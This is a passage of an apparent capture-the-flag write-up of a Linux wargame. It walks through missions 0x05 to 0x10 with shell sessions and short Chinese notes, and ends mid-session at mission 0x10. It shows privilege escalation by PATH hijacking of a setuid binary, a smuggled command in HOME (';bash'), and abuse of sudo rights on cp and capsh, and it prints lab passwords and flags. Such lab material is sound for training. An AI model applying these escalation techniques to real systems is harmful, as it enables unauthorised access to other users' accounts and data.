drwxr-xr-x <span class="token number">1</span> root      root       <span class="token number">4096</span> Apr  <span class="token number">5</span> 06:36 <span class="token punctuation">..</span>
-rw-r--r-- <span class="token number">1</span> andromeda andromeda   <span class="token number">220</span> Apr <span class="token number">23</span>  <span class="token number">2023</span> .bash_logout
-rw-r--r-- <span class="token number">1</span> andromeda andromeda  <span class="token number">3526</span> Apr <span class="token number">23</span>  <span class="token number">2023</span> .bashrc
-rw-r--r-- <span class="token number">1</span> andromeda andromeda   <span class="token number">807</span> Apr <span class="token number">23</span>  <span class="token number">2023</span> .profile
-r--r----- <span class="token number">1</span> anthea    anthea       <span class="token number">21</span> Apr  <span class="token number">5</span> 06:36 anthea_pass.txt
-rw-r----- <span class="token number">1</span> root      andromeda    <span class="token number">22</span> Apr  <span class="token number">5</span> 06:36 flagz.txt
-rw-r----- <span class="token number">1</span> root      andromeda   <span class="token number">166</span> Apr  <span class="token number">5</span> 06:36 mission.txt
-rwS--s--- <span class="token number">1</span> root      andromeda <span class="token number">16056</span> Apr  <span class="token number">5</span> 06:36 uid
andromeda@hades:~$ ca tfl
-bash: ca: <span class="token builtin class-name">command</span> not found
andromeda@hades:~$ <span class="token function">cat</span> flagz.txt 
^xzsHGrOeNctIZLGKzWq^</code></pre>
<h2 id="MISSION-0x05"><a href="#MISSION-0x05" class="headerlink" title="MISSION 0x05"></a>MISSION 0x05</h2><pre class="language-bash" data-language="bash"><code class="language-bash">andromeda@hades:~$ <span class="token function">cat</span> mission.txt 
<span class="token comment">################</span>
<span class="token comment"># MISSION 0x05 #</span>
<span class="token comment">################</span>

<span class="token comment">## EN ##</span>
The user anthea reminds us <span class="token function">who</span> we are.

<span class="token comment">## ES ##</span>
La usuaria anthea procura que no olvidemos quien somos.</code></pre>
<p>软连接</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">andromeda@hades:~$ <span class="token function">ln</span> <span class="token parameter variable">-s</span> /bin/bash /tmp/id
ln: failed to create symbolic <span class="token function">link</span> <span class="token string">'/tmp/id'</span><span class="token builtin class-name">:</span> File exists
andromeda@hades:~$ <span class="token function">rm</span> /tmp/id
andromeda@hades:~$ <span class="token function">ln</span> <span class="token parameter variable">-s</span> /bin/bash /tmp/id
andromeda@hades:~$ <span class="token assign-left variable"><span class="token environment constant">PATH</span></span><span class="token operator">=</span>/tmp
andromeda@hades:~$ ./uid
anthea@hades:~$ <span class="token assign-left variable"><span class="token environment constant">PATH</span></span><span class="token operator">=</span>/usr/bin
anthea@hades:~$ <span class="token function">id</span>
<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">2047</span><span class="token punctuation">(</span>anthea<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">2046</span><span class="token punctuation">(</span>andromeda<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">2046</span><span class="token punctuation">(</span>andromeda<span class="token punctuation">)</span>
anthea@hades:~$ <span class="token function">cat</span> anthea_pass.txt
yWFLtSNQArEBTHtWgkKd</code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">anthea@hades:~$ <span class="token function">ls</span> <span class="token parameter variable">-al</span>
total <span class="token number">52</span>
drwxr-x--- <span class="token number">2</span> root      anthea     <span class="token number">4096</span> Apr  <span class="token number">5</span> 06:36 <span class="token builtin class-name">.</span>
drwxr-xr-x <span class="token number">1</span> root      root       <span class="token number">4096</span> Apr  <span class="token number">5</span> 06:36 <span class="token punctuation">..</span>
-rw-r--r-- <span class="token number">1</span> anthea    anthea      <span class="token number">220</span> Apr <span class="token number">23</span>  <span class="token number">2023</span> .bash_logout
-rw-r--r-- <span class="token number">1</span> anthea    anthea     <span class="token number">3526</span> Apr <span class="token number">23</span>  <span class="token number">2023</span> .bashrc
-rw-r--r-- <span class="token number">1</span> anthea    anthea      <span class="token number">807</span> Apr <span class="token number">23</span>  <span class="token number">2023</span> .profile
-r--r----- <span class="token number">1</span> aphrodite aphrodite    <span class="token number">21</span> Apr  <span class="token number">5</span> 06:36 aphrodite_pass.txt
-rw-r----- <span class="token number">1</span> root      anthea       <span class="token number">22</span> Apr  <span class="token number">5</span> 06:36 flagz.txt
-rw-r----- <span class="token number">1</span> root      anthea      <span class="token number">175</span> Apr  <span class="token number">5</span> 06:36 mission.txt
-rwS--s--- <span class="token number">1</span> root      anthea    <span class="token number">16256</span> Apr  <span class="token number">5</span> 06:36 obsessed
anthea@hades:~$ <span class="token function">cat</span> flagz.txt 
^AcFLuAjhydNKIkPoFLL^</code></pre>
<h2 id="MISSION-0x06"><a href="#MISSION-0x06" class="headerlink" title="MISSION 0x06"></a>MISSION 0x06</h2><pre class="language-bash" data-language="bash"><code class="language-bash">anthea@hades:~$ <span class="token function">cat</span> mission.txt 
<span class="token comment">################</span>
<span class="token comment"># MISSION 0x06 #</span>
<span class="token comment">################</span>

<span class="token comment">## EN ##</span>
User aphrodite is obsessed with the number <span class="token number">94</span>. 

<span class="token comment">## ES ##</span>
La usuaria aphrodite esta obsesionada con el numero <span class="token number">94</span>.</code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">anthea@hades:~$ ./obsessed 
No MYID ENV
anthea@hades:~$ <span class="token builtin class-name">export</span> <span class="token assign-left variable">MYID</span><span class="token operator">=</span><span class="token number">94</span>
anthea@hades:~$ ./obsessed 
Current MYID: <span class="token number">57</span>
Incorrect MYID
anthea@hades:~$ <span class="token builtin class-name">export</span> <span class="token assign-left variable">MYID</span><span class="token operator">=</span>^
anthea@hades:~$ ./obsessed
Current MYID: <span class="token number">94</span>
aphrodite@hades:~$ <span class="token function">id</span>
<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">2048</span><span class="token punctuation">(</span>aphrodite<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">2047</span><span class="token punctuation">(</span>anthea<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">2047</span><span class="token punctuation">(</span>anthea<span class="token punctuation">)</span></code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">aphrodite@hades:~$ <span class="token function">cat</span> aphrodite_pass.txt 
HPJVaqRzieKQeyyATsFv
aphrodite@hades:~$ <span class="token function">cat</span> flagz.txt 
^fmPlsDByrwmEpRAKgeP^</code></pre>
<h2 id="MISSION-0x07"><a href="#MISSION-0x07" class="headerlink" title="MISSION 0x07"></a>MISSION 0x07</h2><pre class="language-bash" data-language="bash"><code class="language-bash">aphrodite@hades:~$ <span class="token function">cat</span> mission.txt 
<span class="token comment">################</span>
<span class="token comment"># MISSION 0x07 #</span>
<span class="token comment">################</span>

<span class="token comment">## EN ##</span>
The user ariadne knows what we keep <span class="token keyword">in</span> our <span class="token environment constant">HOME</span><span class="token builtin class-name">.</span>

<span class="token comment">## ES ##</span>
La usuaria ariadne sabe que es lo que guardamos en nuestro <span class="token environment constant">HOME</span><span class="token builtin class-name">.</span></code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">aphrodite@hades:~$ ./homecontent 
The content of your <span class="token environment constant">HOME</span> is:
ariadne_pass.txt  flagz.txt  homecontent  mission.txt</code></pre>
<p>猜测执行ls+环境变量里面的home变量</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">aphrodite@hades:~$ <span class="token function">env</span>
<span class="token assign-left variable"><span class="token environment constant">SHELL</span></span><span class="token operator">=</span>/bin/bash
<span class="token assign-left variable"><span class="token environment constant">PWD</span></span><span class="token operator">=</span>/pwned/aphrodite
<span class="token assign-left variable"><span class="token environment constant">LOGNAME</span></span><span class="token operator">=</span>aphrodite
<span class="token assign-left variable">MOTD_SHOWN</span><span class="token operator">=</span>pam
<span class="token assign-left variable"><span class="token environment constant">HOME</span></span><span class="token operator">=</span>/pwned/aphrodite
<span class="token assign-left variable"><span class="token environment constant">LANG</span></span><span class="token operator">=</span>C.UTF-8
<span class="token assign-left variable"><span class="token environment constant">LS_COLORS</span></span><span class="token operator">=</span>rs<span class="token operator">=</span><span class="token number">0</span>:di<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">34</span>:ln<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">36</span>:mh<span class="token operator">=</span>00:pi<span class="token operator">=</span><span class="token number">40</span><span class="token punctuation">;</span><span class="token number">33</span>:so<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">35</span>:do<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">35</span>:bd<span class="token operator">=</span><span class="token number">40</span><span class="token punctuation">;</span><span class="token number">33</span><span class="token punctuation">;</span>01:cd<span class="token operator">=</span><span class="token number">40</span><span class="token punctuation">;</span><span class="token number">33</span><span class="token punctuation">;</span>01:or<span class="token operator">=</span><span class="token number">40</span><span class="token punctuation">;</span><span class="token number">31</span><span class="token punctuation">;</span>01:mi<span class="token operator">=</span>00:su<span class="token operator">=</span><span class="token number">37</span><span class="token punctuation">;</span><span class="token number">41</span>:sg<span class="token operator">=</span><span class="token number">30</span><span class="token punctuation">;</span><span class="token number">43</span>:ca<span class="token operator">=</span>00:tw<span class="token operator">=</span><span class="token number">30</span><span class="token punctuation">;</span><span class="token number">42</span>:ow<span class="token operator">=</span><span class="token number">34</span><span class="token punctuation">;</span><span class="token number">42</span>:st<span class="token operator">=</span><span class="token number">37</span><span class="token punctuation">;</span><span class="token number">44</span>:ex<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">32</span>:*.tar<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">31</span>:*.tgz<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">31</span>:*.arc<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">31</span>:*.arj<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">31</span>:*.taz<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">31</span>:*.lha<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">31</span>:*.lz4<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">31</span>:*.lzh<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">31</span>:*.lzma<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">31</span>:*.tlz<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">31</span>:*.txz<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">31</span>:*.tzo<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">31</span>:*.t7z<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">31</span>:*.zip<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">31</span>:*.z<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">31</span>:*.dz<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">31</span>:*.gz<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">31</span>:*.lrz<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">31</span>:*.lz<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">31</span>:*.lzo<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">31</span>:*.xz<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">31</span>:*.zst<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">31</span>:*.tzst<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">31</span>:*.bz2<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">31</span>:*.bz<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">31</span>:*.tbz<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">31</span>:*.tbz2<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">31</span>:*.tz<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">31</span>:*.deb<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">31</span>:*.rpm<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">31</span>:*.jar<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">31</span>:*.war<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">31</span>:*.ear<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">31</span>:*.sar<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">31</span>:*.rar<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">31</span>:*.alz<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">31</span>:*.ace<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">31</span>:*.zoo<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">31</span>:*.cpio<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">31</span>:*.7z<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">31</span>:*.rz<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">31</span>:*.cab<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">31</span>:*.wim<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">31</span>:*.swm<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">31</span>:*.dwm<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">31</span>:*.esd<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">31</span>:*.avif<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">35</span>:*.jpg<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">35</span>:*.jpeg<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">35</span>:*.mjpg<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">35</span>:*.mjpeg<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">35</span>:*.gif<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">35</span>:*.bmp<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">35</span>:*.pbm<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">35</span>:*.pgm<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">35</span>:*.ppm<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">35</span>:*.tga<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">35</span>:*.xbm<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">35</span>:*.xpm<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">35</span>:*.tif<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">35</span>:*.tiff<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">35</span>:*.png<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">35</span>:*.svg<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">35</span>:*.svgz<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">35</span>:*.mng<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">35</span>:*.pcx<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">35</span>:*.mov<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">35</span>:*.mpg<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">35</span>:*.mpeg<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">35</span>:*.m2v<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">35</span>:*.mkv<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">35</span>:*.webm<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">35</span>:*.webp<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">35</span>:*.ogm<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">35</span>:*.mp4<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">35</span>:*.m4v<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">35</span>:*.mp4v<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">35</span>:*.vob<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">35</span>:*.qt<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">35</span>:*.nuv<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">35</span>:*.wmv<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">35</span>:*.asf<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">35</span>:*.rm<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">35</span>:*.rmvb<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">35</span>:*.flc<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">35</span>:*.avi<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">35</span>:*.fli<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">35</span>:*.flv<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">35</span>:*.gl<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">35</span>:*.dl<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">35</span>:*.xcf<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">35</span>:*.xwd<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">35</span>:*.yuv<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">35</span>:*.cgm<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">35</span>:*.emf<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">35</span>:*.ogv<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">35</span>:*.ogx<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">35</span>:*.aac<span class="token operator">=</span>00<span class="token punctuation">;</span><span class="token number">36</span>:*.au<span class="token operator">=</span>00<span class="token punctuation">;</span><span class="token number">36</span>:*.flac<span class="token operator">=</span>00<span class="token punctuation">;</span><span class="token number">36</span>:*.m4a<span class="token operator">=</span>00<span class="token punctuation">;</span><span class="token number">36</span>:*.mid<span class="token operator">=</span>00<span class="token punctuation">;</span><span class="token number">36</span>:*.midi<span class="token operator">=</span>00<span class="token punctuation">;</span><span class="token number">36</span>:*.mka<span class="token operator">=</span>00<span class="token punctuation">;</span><span class="token number">36</span>:*.mp3<span class="token operator">=</span>00<span class="token punctuation">;</span><span class="token number">36</span>:*.mpc<span class="token operator">=</span>00<span class="token punctuation">;</span><span class="token number">36</span>:*.ogg<span class="token operator">=</span>00<span class="token punctuation">;</span><span class="token number">36</span>:*.ra<span class="token operator">=</span>00<span class="token punctuation">;</span><span class="token number">36</span>:*.wav<span class="token operator">=</span>00<span class="token punctuation">;</span><span class="token number">36</span>:*.oga<span class="token operator">=</span>00<span class="token punctuation">;</span><span class="token number">36</span>:*.opus<span class="token operator">=</span>00<span class="token punctuation">;</span><span class="token number">36</span>:*.spx<span class="token operator">=</span>00<span class="token punctuation">;</span><span class="token number">36</span>:*.xspf<span class="token operator">=</span>00<span class="token punctuation">;</span><span class="token number">36</span>:*~<span class="token operator">=</span>00<span class="token punctuation">;</span><span class="token number">90</span>:*<span class="token comment">#=00;90:*.bak=00;90:*.old=00;90:*.orig=00;90:*.part=00;90:*.rej=00;90:*.swp=00;90:*.tmp=00;90:*.dpkg-dist=00;90:*.dpkg-old=00;90:*.ucf-dist=00;90:*.ucf-new=00;90:*.ucf-old=00;90:*.rpmnew=00;90:*.rpmorig=00;90:*.rpmsave=00;90:</span>
<span class="token assign-left variable">SSH_CONNECTION</span><span class="token operator">=</span><span class="token number">127.0</span>.0.1 <span class="token number">38114</span> <span class="token number">127.0</span>.0.1 <span class="token number">22</span>
<span class="token assign-left variable"><span class="token environment constant">TERM</span></span><span class="token operator">=</span>xterm-256color
<span class="token assign-left variable"><span class="token environment constant">USER</span></span><span class="token operator">=</span>aphrodite
<span class="token assign-left variable"><span class="token environment constant">SHLVL</span></span><span class="token operator">=</span><span class="token number">1</span>
<span class="token assign-left variable">SSH_CLIENT</span><span class="token operator">=</span><span class="token number">127.0</span>.0.1 <span class="token number">38114</span> <span class="token number">22</span>
<span class="token assign-left variable"><span class="token environment constant">PATH</span></span><span class="token operator">=</span>/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
<span class="token assign-left variable">SSH_TTY</span><span class="token operator">=</span>/dev/pts/16
<span class="token assign-left variable">_</span><span class="token operator">=</span>/usr/bin/env</code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">aphrodite@hades:~$ <span class="token builtin class-name">export</span> <span class="token assign-left variable"><span class="token environment constant">HOME</span></span><span class="token operator">=</span><span class="token number">123</span>
aphrodite@hades:/pwned/aphrodite$ ./homecontent 
The content of your <span class="token environment constant">HOME</span> is:
/bin/ls: cannot access <span class="token string">'123'</span><span class="token builtin class-name">:</span> No such <span class="token function">file</span> or directory</code></pre>
<p>事实如此</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">aphrodite@hades:/pwned/aphrodite$ <span class="token builtin class-name">export</span> <span class="token assign-left variable"><span class="token environment constant">HOME</span></span><span class="token operator">=</span><span class="token punctuation">;</span><span class="token function">id</span>
<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">2048</span><span class="token punctuation">(</span>aphrodite<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">2048</span><span class="token punctuation">(</span>aphrodite<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">2048</span><span class="token punctuation">(</span>aphrodite<span class="token punctuation">)</span>
aphrodite@hades:/pwned/aphrodite$ ./homecontent 
The content of your <span class="token environment constant">HOME</span> is:
ariadne_pass.txt  flagz.txt  homecontent  mission.txt</code></pre>
<p>有点问题</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">aphrodite@hades:/pwned/aphrodite$ <span class="token builtin class-name">export</span> <span class="token assign-left variable"><span class="token environment constant">HOME</span></span><span class="token operator">=</span><span class="token string">';id'</span>
aphrodite@hades:/pwned/aphrodite$ ./homecontent 
The content of your <span class="token environment constant">HOME</span> is:
ariadne_pass.txt  flagz.txt  homecontent  mission.txt
<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">2049</span><span class="token punctuation">(</span>ariadne<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">2048</span><span class="token punctuation">(</span>aphrodite<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">2048</span><span class="token punctuation">(</span>aphrodite<span class="token punctuation">)</span></code></pre>
<p>加上单引号结果正确</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">aphrodite@hades:/pwned/aphrodite$ <span class="token builtin class-name">export</span> <span class="token assign-left variable"><span class="token environment constant">HOME</span></span><span class="token operator">=</span><span class="token string">';bash'</span>
aphrodite@hades:/pwned/aphrodite$ ./homecontent 
The content of your <span class="token environment constant">HOME</span> is:
ariadne_pass.txt  flagz.txt  homecontent  mission.txt
ariadne@hades:/pwned/aphrodite$ <span class="token function">id</span>
<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">2049</span><span class="token punctuation">(</span>ariadne<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">2048</span><span class="token punctuation">(</span>aphrodite<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">2048</span><span class="token punctuation">(</span>aphrodite<span class="token punctuation">)</span>
ariadne@hades:/pwned/aphrodite$ <span class="token function">ls</span>
ariadne_pass.txt  flagz.txt  homecontent  mission.txt
ariadne@hades:/pwned/aphrodite$ <span class="token function">cat</span> ariadne_pass.txt 
iNgNazuJrmhJKWixktzk</code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">ariadne@hades:~$ <span class="token function">cat</span> flagz.txt 
^FuGFaFNhtKNxUInxAtd^</code></pre>
<h2 id="MISSION-0x08"><a href="#MISSION-0x08" class="headerlink" title="MISSION 0x08"></a>MISSION 0x08</h2><pre class="language-bash" data-language="bash"><code class="language-bash">ariadne@hades:~$ <span class="token function">cat</span> mission.txt 
<span class="token comment">################</span>
<span class="token comment"># MISSION 0x08 #</span>
<span class="token comment">################</span>

<span class="token comment">## EN ##</span>
The user arete lets us use <span class="token function">cp</span> on her behalf. 

<span class="token comment">## ES ##</span>
La usuaria arete nos deja usar <span class="token function">cp</span> en <span class="token function">su</span> nombre.</code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">ariadne@hades:~$ <span class="token function">cp</span> /run/lock/arete_pass.txt <span class="token builtin class-name">.</span>
cp: cannot <span class="token function">open</span> <span class="token string">'/run/lock/arete_pass.txt'</span> <span class="token keyword">for</span> reading: Permission denied
ariadne@hades:~$ <span class="token function">sudo</span> <span class="token parameter variable">-l</span>
Matching Defaults entries <span class="token keyword">for</span> ariadne on hades:
    env_reset, mail_badpass, <span class="token assign-left variable">secure_path</span><span class="token operator">=</span>/usr/local/sbin<span class="token punctuation">\</span>:/usr/local/bin<span class="token punctuation">\</span>:/usr/sbin<span class="token punctuation">\</span>:/usr/bin<span class="token punctuation">\</span>:/sbin<span class="token punctuation">\</span>:/bin, use_pty

User ariadne may run the following commands on hades:
    <span class="token punctuation">(</span>arete<span class="token punctuation">)</span> NOPASSWD: /bin/cp</code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">ariadne@hades:~$ <span class="token function">find</span> / <span class="token parameter variable">-name</span> arete* <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null
/run/lock/arete_pass.txt
/var/tmp/arete_pass.txt
/var/tmp/333/arete
/var/tmp/arete
/pwned/arete
ariadne@hades:~$ <span class="token function">touch</span> /var/tmp/taotao
ariadne@hades:~$ <span class="token function">chmod</span>  <span class="token number">777</span> /var/tmp/taotao
ariadne@hades:~$ <span class="token function">sudo</span> <span class="token parameter variable">-u</span> arete /bin/cp /run/lock/arete_pass.txt /var/tmp/taotao
ariadne@hades:~$ <span class="token function">cat</span> /var/tmp/taotao
QjrIovHacmGWxVjXRLmA</code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">arete@hades:~$ <span class="token function">ls</span>
flagz.txt  mission.txt
arete@hades:~$ <span class="token function">cat</span> flagz.txt 
^qmrrbGUXLTqLFDyCDlx^</code></pre>
<h2 id="MISSION-0x09"><a href="#MISSION-0x09" class="headerlink" title="MISSION 0x09"></a>MISSION 0x09</h2><pre class="language-bash" data-language="bash"><code class="language-bash">arete@hades:~$ <span class="token function">cat</span> mission.txt 
<span class="token comment">################</span>
<span class="token comment"># MISSION 0x09 #</span>
<span class="token comment">################</span>

<span class="token comment">## EN ##</span>
The user artemis allows us to use some binary on her behalf. Its a gift<span class="token punctuation">..</span>. 

<span class="token comment">## ES ##</span>
La usuaria artemis nos permite usar algun binario en <span class="token function">su</span> nombre. Es un regalo<span class="token punctuation">..</span>.</code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">arete@hades:~$ <span class="token function">cat</span> mission.txt 
<span class="token comment">################</span>
<span class="token comment"># MISSION 0x09 #</span>
<span class="token comment">################</span>

<span class="token comment">## EN ##</span>
The user artemis allows us to use some binary on her behalf. Its a gift<span class="token punctuation">..</span>. 

<span class="token comment">## ES ##</span>
La usuaria artemis nos permite usar algun binario en <span class="token function">su</span> nombre. Es un regalo<span class="token punctuation">..</span>.
arete@hades:~$ <span class="token function">sudo</span> <span class="token parameter variable">-l</span>
Matching Defaults entries <span class="token keyword">for</span> arete on hades:
    env_reset, mail_badpass, <span class="token assign-left variable">secure_path</span><span class="token operator">=</span>/usr/local/sbin<span class="token punctuation">\</span>:/usr/local/bin<span class="token punctuation">\</span>:/usr/sbin<span class="token punctuation">\</span>:/usr/bin<span class="token punctuation">\</span>:/sbin<span class="token punctuation">\</span>:/bin, use_pty

User arete may run the following commands on hades:
    <span class="token punctuation">(</span>artemis<span class="token punctuation">)</span> NOPASSWD: /sbin/capsh</code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">arete@hades:~$ <span class="token function">sudo</span> <span class="token parameter variable">-u</span> artemis /sbin/capsh --
artemis@hades:/pwned/arete$ <span class="token function">id</span>
<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">2051</span><span class="token punctuation">(</span>artemis<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">2051</span><span class="token punctuation">(</span>artemis<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">2051</span><span class="token punctuation">(</span>artemis<span class="token punctuation">)</span>
artemis@hades:/pwned/arete$ <span class="token builtin class-name">cd</span> ~
artemis@hades:~$ <span class="token function">ls</span>
flagz.txt  mission.txt  restricted
artemis@hades:~$ <span class="token function">cat</span> flagz.txt 
^SegGdzPgnNdGAmKjnsa^
artemis@hades:~$ <span class="token function">find</span> / <span class="token parameter variable">-name</span> artem* <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null
/usr/share/artemis_pass.txt
/pwned/artemis
artemis@hades:~$ <span class="token function">cat</span> /usr/share/artemis_pass.txt
HIiaojeORLaJBVSPDDCZ</code></pre>
<h2 id="MISSION-0x10"><a href="#MISSION-0x10" class="headerlink" title="MISSION 0x10"></a>MISSION 0x10</h2><pre class="language-bash" data-language="bash"><code class="language-bash">artemis@hades:~$ <span class="token function">cat</span> mission.txt 
<span class="token comment">################</span>
<span class="token comment"># MISSION 0x10 #</span>
<span class="token comment">################</span>

<span class="token comment">## EN ##</span>
We need /bin/bash so that the user asia gives us her password. 

<span class="token comment">## ES ##</span>
Necesitamos /bin/bash para que la usuaria asia nos de <span class="token function">su</span> password.</code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">artemis@hades:~$ ./restricted 
